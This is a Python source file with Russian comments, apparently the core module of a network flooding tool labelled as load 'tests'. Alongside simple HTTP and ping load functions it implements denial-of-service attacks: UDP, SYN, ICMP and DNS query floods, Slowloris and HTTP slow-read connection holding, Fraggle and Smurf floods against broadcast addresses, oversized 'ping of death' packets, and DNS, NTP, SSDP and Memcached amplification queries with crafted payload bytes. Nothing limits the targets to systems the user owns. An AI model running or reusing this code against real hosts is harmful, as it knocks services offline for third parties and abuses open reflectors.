# core.py
import asyncio
import aiohttp
import time
import socket
import random
from concurrent.futures import ThreadPoolExecutor
from ping3 import ping
import struct
from typing import List, Dict, Any, Optional
from utils import logger

# Список User-Agent для рандомизации в HTTP
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
]

async def http_request(session, url, index, method: str = 'GET', data: Optional[bytes] = None, headers: Optional[Dict] = None):
    """Отправка одного HTTP-запроса с углубленной реализацией"""
    start_time = time.time()
    try:
        if headers is None:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
        timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)
        async with session.request(method.lower(), url, data=data, headers=headers, timeout=timeout) as response:
            status = response.status
            elapsed = time.time() - start_time
            size = len(await response.read()) if status == 200 else 0
            logger.debug(f"HTTP запрос {index} ({method}): статус {status}, время {elapsed:.3f}s, размер {size}b")
            return {"index": index, "status": status, "time": elapsed, "size": size, "error": None}
    except asyncio.TimeoutError:
        logger.warning(f"HTTP запрос {index} ({method}): таймаут")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": "Timeout"}
    except aiohttp.ClientConnectorError as e:
        logger.warning(f"HTTP запрос {index} ({method}): ошибка подключения - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": f"Connection error: {str(e)}"}
    except aiohttp.ServerDisconnectedError as e:
        logger.warning(f"HTTP запрос {index} ({method}): сервер отключен - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": f"Server disconnected: {str(e)}"}
    except aiohttp.ClientError as e:
        logger.warning(f"HTTP запрос {index} ({method}): клиентская ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": str(e)}
    except socket.gaierror as e:
        logger.error(f"HTTP запрос {index} ({method}): DNS ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": f"DNS error: {str(e)}"}
    except Exception as e:
        logger.error(f"HTTP запрос {index} ({method}): неожиданная ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": str(e)}

async def run_http_test(url, num_requests, concurrent, method: str = 'GET', data: Optional[bytes] = None):
    """Углубленный запуск теста HTTP-запросов с поддержкой POST и рандомизацией"""
    results = []
    try:
        connector = aiohttp.TCPConnector(limit=concurrent * 2, limit_per_host=concurrent, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(concurrent)
            async def bounded_request():
                async with semaphore:
                    return await http_request(session, url, len(results), method, data)
            tasks = [bounded_request() for _ in range(num_requests)]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            results.extend([r for r in batch_results if not isinstance(r, Exception)])
            if isinstance(batch_results, list):
                for exc in batch_results:
                    if isinstance(exc, Exception):
                        results.append({"index": len(results), "status": None, "time": 0, "size": 0, "error": str(exc)})
        logger.info(f"HTTP тест ({method}) завершен: {len(results)} запросов обработано")
    except aiohttp.ClientSessionError as e:
        logger.error(f"Ошибка сессии в HTTP тесте: {e}")
    except socket.gaierror as e:
        logger.error(f"DNS ошибка в HTTP тесте: {e}")
    except Exception as e:
        logger.error(f"Неожиданная ошибка в HTTP тесте: {e}")
    return results

def ping_request(ip, index):
    """Отправка одного ping-запроса"""
    start_time = time.time()
    try:
        response_time = ping(ip, timeout=2)
        if response_time is None:
            logger.warning(f"Ping {index}: таймаут")
            return {"index": index, "status": "timeout", "time": time.time() - start_time, "size": 0, "error": "Ping timeout"}
        logger.debug(f"Ping {index}: успех, время {response_time:.3f}s")
        return {"index": index, "status": "success", "time": response_time, "size": 0, "error": None}
    except socket.gaierror as e:
        logger.error(f"Ping {index}: DNS ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": f"DNS error: {str(e)}"}
    except socket.error as e:
        logger.warning(f"Ping {index}: сокет ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": f"Socket error: {str(e)}"}
    except Exception as e:
        logger.error(f"Ping {index}: ошибка - {e}")
        return {"index": index, "status": None, "time": time.time() - start_time, "size": 0, "error": str(e)}

def run_ping_test(ip, num_requests, concurrent):
    """Запуск теста ping-запросов"""
    results = []
    try:
        with ThreadPoolExecutor(max_workers=concurrent) as executor:
            futures = [executor.submit(ping_request, ip, i) for i in range(num_requests)]
            for future in futures:
                try:
                    result = future.result(timeout=5)
                    results.append(result)
                except concurrent.futures.TimeoutError:
                    logger.warning("Таймаут в ping future")
                    results.append({"index": None, "status": None, "time": 0, "size": 0, "error": "Future timeout"})
                except Exception as e:
                    logger.error(f"Ошибка в ping future: {e}")
                    results.append({"index": None, "status": None, "time": 0, "size": 0, "error": str(e)})
        logger.info(f"Ping тест завершен: {len(results)} запросов обработано")
    except socket.gaierror as e:
        logger.error(f"DNS ошибка в ping тесте: {e}")
    except Exception as e:
        logger.error(f"Неожиданная ошибка в ping тесте: {e}")
    return results

def run_syn_flood(target_ip, num_packets, port=80):
    """SYN Flood с использованием connect() (без Scapy/raw sockets)"""
    results = []
    try:
        for i in range(num_packets):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((target_ip, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                sock.close()
                results.append({"index": i, "status": "sent", "time": 0, "size": 0, "error": None})
                logger.debug(f"SYN connect {i} отправлен")
            except:
                sock.close()
                results.append({"index": i, "status": "failed", "time": 0, "size": 0, "error": "Connect failed"})
        logger.info(f"SYN Flood завершен: {len(results)} соединений")
    except Exception as e:
        logger.error(f"Ошибка в SYN Flood: {e}")
        results.append({"index": 0, "status": None, "time": 0, "size": 0, "error": str(e)})
    return results

def run_udp_flood(target_ip, num_packets, port):
    """UDP Flood тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bytes_data = random._urandom(1490)
        for i in range(num_packets):
            sock.sendto(bytes_data, (target_ip, port))
            results.append({"index": i, "status": "sent", "time": 0, "size": 1490, "error": None})
            logger.debug(f"UDP пакет {i} отправлен")
        sock.close()
        logger.info(f"UDP Flood завершен: {len(results)} пакетов отправлено")
    except Exception as e:
        logger.error(f"Ошибка в UDP Flood: {e}")
        results.append({"index": 0, "status": None, "time": 0, "size": 0, "error": str(e)})
    return results

def run_icmp_flood(target_ip, num_packets):
    """ICMP Flood via ping (без raw)"""
    results = []
    try:
        for i in range(num_packets):
            result = ping_request(target_ip, i)
            results.append(result)
        logger.info(f"ICMP Flood завершен: {len(results)} пакетов")
    except Exception as e:
        logger.error(f"Ошибка в ICMP Flood: {e}")
        results.append({"index": 0, "status": None, "time": 0, "size": 0, "error": str(e)})
    return results

async def run_slowloris(target_url, duration):
    """Slowloris тест"""
    results = []
    try:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            start_time = time.time()
            conn_count = 0
            while time.time() - start_time < duration:
                for i in range(20):
                    if conn_count < 100:
                        task = asyncio.create_task(send_slowloris_request(session, target_url, conn_count))
                        tasks.append(task)
                        conn_count += 1
                await asyncio.sleep(0.5)
            for task in tasks[:100]:
                try:
                    result = await asyncio.wait_for(task, timeout=1)
                    results.append(result)
                except asyncio.TimeoutError:
                    results.append({"index": conn_count, "status": "held_timeout", "time": 0, "size": 0, "error": "Timeout held"})
                except Exception:
                    pass
        logger.info(f"Slowloris завершен: {len(results)} соединений")
    except Exception as e:
        logger.error(f"Ошибка в Slowloris: {e}")
    return results

async def send_slowloris_request(session, url, index):
    """Один Slowloris запрос - держит соединение"""
    try:
        timeout = aiohttp.ClientTimeout(total=None, connect=10)
        headers = {'User-Agent': random.choice(USER_AGENTS), 'Connection': 'keep-alive'}
        async with session.get(url, headers=headers, timeout=timeout) as response:
            await response.content.read(1)
            await asyncio.sleep(30)
            return {"index": index, "status": "held", "time": 30, "size": 0, "error": None}
    except Exception as e:
        return {"index": index, "status": None, "time": 0, "size": 0, "error": str(e)}

def run_dns_amplification(dns_server, num_queries):
    """DNS Amplification тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'
        for i in range(num_queries):
            sock.sendto(dns_query, (dns_server, 53))
            try:
                data, addr = sock.recvfrom(4096)
                amp_factor = len(data) / len(dns_query)
                results.append({"index": i, "status": "amplified", "time": 0, "size": len(data), "error": None, "amp": amp_factor})
                logger.debug(f"DNS запрос {i}: {len(data)} байт, amp {amp_factor:.2f}x")
            except socket.timeout:
                results.append({"index": i, "status": "timeout", "time": 0, "size": 0, "error": "No response"})
        sock.close()
        logger.info(f"DNS Amplification завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в DNS Amplification: {e}")
    return results

def run_ntp_amplification(ntp_server, num_queries):
    """NTP Amplification тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        for i in range(num_queries):
            sock.sendto(ntp_query, (ntp_server, 123))
            try:
                data, addr = sock.recvfrom(4096)
                amp_factor = len(data) / len(ntp_query)
                results.append({"index": i, "status": "amplified", "time": 0, "size": len(data), "error": None, "amp": amp_factor})
                logger.debug(f"NTP запрос {i}: {len(data)} байт, amp {amp_factor:.2f}x")
            except socket.timeout:
                results.append({"index": i, "status": "timeout", "time": 0, "size": 0, "error": "No response"})
        sock.close()
        logger.info(f"NTP Amplification завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в NTP Amplification: {e}")
    return results

async def run_http_slow_read(url, duration, concurrent):
    """HTTP Slow Read тест - медленное чтение ответа"""
    results = []
    try:
        connector = aiohttp.TCPConnector(limit=concurrent, limit_per_host=concurrent)
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(concurrent)
            start_time = time.time()
            while time.time() - start_time < duration:
                async with semaphore:
                    task = asyncio.create_task(send_slow_read_request(session, url))
                    results.append(await task)
                await asyncio.sleep(0.1)
        logger.info(f"HTTP Slow Read завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в HTTP Slow Read: {e}")
    return results

async def send_slow_read_request(session, url):
    """Один Slow Read запрос"""
    try:
        timeout = aiohttp.ClientTimeout(total=None, sock_read=None)
        async with session.get(url, timeout=timeout) as response:
            chunk_size = 1
            while True:
                chunk = await response.content.read(chunk_size)
                if not chunk:
                    break
                await asyncio.sleep(1)  # Медленное чтение
            return {"index": random.randint(0, 1000), "status": "slow_read", "time": time.time(), "size": 0, "error": None}
    except Exception as e:
        return {"index": random.randint(0, 1000), "status": None, "time": 0, "size": 0, "error": str(e)}

def run_dns_query_flood(dns_server, num_queries):
    """DNS Query Flood - спам запросами"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        queries = [
            b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',
            b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        ]
        for i in range(num_queries):
            query = random.choice(queries)
            sock.sendto(query, (dns_server, 53))
            results.append({"index": i, "status": "sent", "time": 0, "size": len(query), "error": None})
            logger.debug(f"DNS query {i} отправлен")
        sock.close()
        logger.info(f"DNS Query Flood завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в DNS Query Flood: {e}")
    return results

def run_smurf(victim_ip, broadcast_ip, num_packets):
    """Smurf Attack via ping to broadcast"""
    results = []
    try:
        for i in range(num_packets):
            # Используем ping с -S (source) если возможно, иначе симулируем
            result = ping_request(broadcast_ip, i)
            results.append(result)
        logger.info(f"Smurf Attack завершен: {len(results)} пакетов")
    except Exception as e:
        logger.error(f"Ошибка в Smurf: {e}")
    return results

def run_fraggle(broadcast_ip, port, num_packets):
    """Fraggle Attack тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1490)
        for i in range(num_packets):
            sock.sendto(bytes_data, (broadcast_ip, port))
            results.append({"index": i, "status": "sent", "time": 0, "size": 1490, "error": None})
            logger.debug(f"Fraggle пакет {i} отправлен")
        sock.close()
        logger.info(f"Fraggle Attack завершен: {len(results)} пакетов")
    except Exception as e:
        logger.error(f"Ошибка в Fraggle: {e}")
    return results

def run_ping_of_death(target_ip, num_packets):
    """Ping of Death с большим payload via ping3 (ограничено)"""
    results = []
    try:
        for i in range(num_packets):
            # ping3 не поддерживает oversized, симулируем большим размером
            response_time = ping(target_ip, size=65500, timeout=2)
            if response_time:
                results.append({"index": i, "status": "sent", "time": response_time, "size": 65500, "error": None})
            else:
                results.append({"index": i, "status": "failed", "time": 0, "size": 0, "error": "No response"})
            logger.debug(f"Ping of Death {i} отправлен")
        logger.info(f"Ping of Death завершен: {len(results)} пакетов")
    except Exception as e:
        logger.error(f"Ошибка в Ping of Death: {e}")
    return results

def run_ssdp_amplification(ssdp_server, num_queries):
    """SSDP Amplification тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        ssdp_query = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nST: ssdp:all\r\nMX: 3\r\n\r\n'
        for i in range(num_queries):
            sock.sendto(ssdp_query, (ssdp_server, 1900))
            try:
                data, addr = sock.recvfrom(4096)
                amp_factor = len(data) / len(ssdp_query)
                results.append({"index": i, "status": "amplified", "time": 0, "size": len(data), "error": None, "amp": amp_factor})
                logger.debug(f"SSDP запрос {i}: {len(data)} байт, amp {amp_factor:.2f}x")
            except socket.timeout:
                results.append({"index": i, "status": "timeout", "time": 0, "size": 0, "error": "No response"})
        sock.close()
        logger.info(f"SSDP Amplification завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в SSDP Amplification: {e}")
    return results

def run_memcached_amplification(memcached_server, num_queries):
    """Memcached Amplification тест"""
    results = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        # Stats запрос для amplification
        stats_query = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        for i in range(num_queries):
            sock.sendto(stats_query, (memcached_server, 11211))
            try:
                data, addr = sock.recvfrom(65535)
                amp_factor = len(data) / len(stats_query)
                results.append({"index": i, "status": "amplified", "time": 0, "size": len(data), "error": None, "amp": amp_factor})
                logger.debug(f"Memcached запрос {i}: {len(data)} байт, amp {amp_factor:.2f}x")
            except socket.timeout:
                results.append({"index": i, "status": "timeout", "time": 0, "size": 0, "error": "No response"})
        sock.close()
        logger.info(f"Memcached Amplification завершен: {len(results)} запросов")
    except Exception as e:
        logger.error(f"Ошибка в Memcached Amplification: {e}")
    return results

def print_results(results):
    """Вывод статистики результатов с дополнительными метриками"""
    try:
        if not results:
            print("❌ Нет результатов для отображения.")
            return
        total_requests = len(results)
        successful = sum(1 for r in results if r.get("status") in [200, "success", "sent", "held", "amplified", "held_timeout", "slow_read"])
        failed = sum(1 for r in results if r.get("error") is not None)
        times = [r["time"] for r in results if r["time"] is not None and r["time"] > 0]
        avg_time = sum(times) / len(times) if times else 0
        total_size = sum(r.get("size", 0) for r in results)
        print(f"\n📊 Результаты теста:")
        print(f"Всего запросов: {total_requests}")
        print(f"Успешных: {successful}")
        print(f"Неуспешных: {failed}")
        print(f"Среднее время ответа: {avg_time:.3f} сек")
        print(f"Общий трафик: {total_size / 1024:.2f} KB")
        if any(r.get("amp") for r in results):
            avg_amp = sum(r.get("amp", 0) for r in results) / total_requests
            print(f"Средний коэффициент усиления: {avg_amp:.2f}x")
        if failed > 0:
            print("❌ Ошибки (первые 5):")
            errors = [r for r in results if r.get("error")]
            for r in errors[:5]:
                print(f"  Запрос {r['index']}: {r['error']}")
            if len(errors) > 5:
                print(f"  ... и еще {len(errors)-5}")
        logger.info(f"Результаты напечатаны: {successful} успешных из {total_requests}, трафик {total_size}b")
    except Exception as e:
        logger.error(f"Ошибка при печати результатов: {e}")